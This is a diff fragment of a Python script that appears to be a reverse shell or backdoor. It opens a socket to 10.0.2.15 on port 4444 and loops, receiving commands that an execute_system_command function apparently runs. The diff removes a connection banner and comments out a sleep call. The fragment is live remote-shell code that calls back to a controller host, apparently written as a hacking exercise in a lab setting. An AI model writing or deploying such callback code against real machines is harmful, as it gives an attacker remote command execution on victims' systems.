@@ -10,9 +10,7 @@ def execute_system_command(command):
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("10.0.2.15", 4444))	# tuple
 
-connection.send("\n[+] Conneciton established.\n")
-
-time.sleep(10)
+# time.sleep(10)
 
 while True:
 	command = connection.recv(1024) # batch 1024bytes
